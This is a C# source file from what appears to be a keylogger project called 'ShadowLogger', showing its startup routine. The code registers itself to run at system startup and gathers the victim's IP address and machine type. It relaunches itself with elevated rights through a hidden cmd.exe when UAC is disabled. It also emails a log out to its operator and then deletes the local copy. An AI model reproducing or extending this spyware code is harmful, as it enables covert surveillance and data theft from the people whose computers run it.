using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using ShadowLogger.bin.Shared_Methods;
using ShadowLogger.bin.UpdateApp;

namespace ShadowLogger.bin.HelperMethods
{
    internal static class ApplicationMethods
    {
        internal static void StartupChecks()
        {
            Updater.CheckForUpdates();
            HostInfo.HostInfo.GetIp();
            HostInfo.HostInfo.GetComputerTypeValue();
            SystemStartup.AddToStartup();

            if (!HostInfo.HostInfo.IsAdmin())
            {
                if (HostInfo.HostInfo.UacStatus() == "Disabled")
                {
                    RestartApplication(true);
                }
            }

            string exceptionsFile = GlobalVariables.GlobalVariables.AppDirectoryLocation + "\\exceptionslog.txt";

            if (!File.Exists(exceptionsFile)) return;

            using (StreamReader sr = new StreamReader(exceptionsFile))
            {
                SharedMethods.SendMail("Exceptions Log", sr.ReadToEnd());
            }

            File.Delete(exceptionsFile);
        }

        internal static void RestartApplication(bool elevate)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe"
            };

            if (elevate)
            {
                procStartInfo.UseShellExecute = true;
                procStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                procStartInfo.Verb = "runas";
            }
            else
            {
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
            }

            procStartInfo.Arguments = string.Format(@"/c ping 1.1.1.1 -n 1 -w 5000 > NUL & start """" ""{0}""", Application.ExecutablePath);

            try
            {
                Process.Start(procStartInfo);
            }
            catch (Win32Exception ex)
            {
                SharedMethods.LogException(ex.TargetSite + " " + "Win32Exception" + " " + ex.Message + " " + ex.NativeErrorCode);
            }
           
            Application.Exit();
        }

      }
}
